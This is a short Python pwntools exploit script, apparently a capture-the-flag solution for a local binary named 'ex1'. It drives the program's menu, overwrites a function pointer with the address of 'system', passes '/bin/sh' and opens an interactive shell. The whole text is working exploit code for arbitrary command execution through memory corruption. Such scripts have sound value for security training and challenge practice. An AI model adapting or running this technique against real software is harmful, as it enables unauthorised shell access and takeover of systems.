#!/usr/bin/env python3
from pwn import *

context.arch = "amd64"

elf = ELF("./bin/ex1")
io =process("./bin/ex1")

system = elf.symbols['system']



io.sendline(b"4\n")
io.sendline(b"3\n")

io.sendline(b"5\n")
io.sendline(b"1\n")
io.sendline(b"0")

io.sendline(p64(system))
io.send(b"dabulemo\n")
io.sendline(b"1\n")
io.sendline(b"1")


io.sendline(b"/bin/sh")
io.send(b"dabulemo\n")


io.sendline(b"2\n")
io.sendline(b"1\n")


io.interactive()
